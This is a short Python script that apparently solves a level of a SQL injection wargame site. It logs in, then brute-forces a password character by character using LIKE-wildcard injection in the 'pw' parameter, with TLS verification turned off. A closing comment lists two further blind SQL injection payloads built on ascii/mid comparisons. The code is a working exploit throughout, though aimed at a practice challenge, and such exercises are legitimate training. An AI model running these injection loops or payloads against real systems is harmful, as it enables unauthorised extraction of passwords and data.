import requests
import time
from bs4 import BeautifulSoup
import requests.packages.urllib3

requests.packages.urllib3.disable_warnings()

def Auth():
    sess = requests.Session()
    url = 'https://los.eagle-jump.org/?login'
    data = {"id": "", "pw": ""} #credentials deleted
    sess.post(url, data = data)
    return sess

def checkSuccess(text):
    return text.find("<h2>Hello ") > -1

sess = Auth()
url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?"

ans = "83"
guess = 32
for guess in range(32,127):
    injection =  "pw="+ ans + chr(guess) + "%"
    html = sess.get(url+injection, verify=False)
    if(checkSuccess(html.text)):
        print("find!: ",guess," ",chr(guess),".")
    time.sleep(0.3)

'''
example payload:
injection = "no=1%20or%20(ord(mid(id,1,1))<98%20and%20ord(mid(pw,"+str(index)+",1))<"+str(guess)+")"
injection = "pw=a%27%20||%20(ascii(mid(id,1,1))>96 %26%26 ascii(mid(id,1,1))<98 %26%26 ascii(mid(pw," + str(index) + ",1))<" + str(guess) + ")%20--%20%27"
'''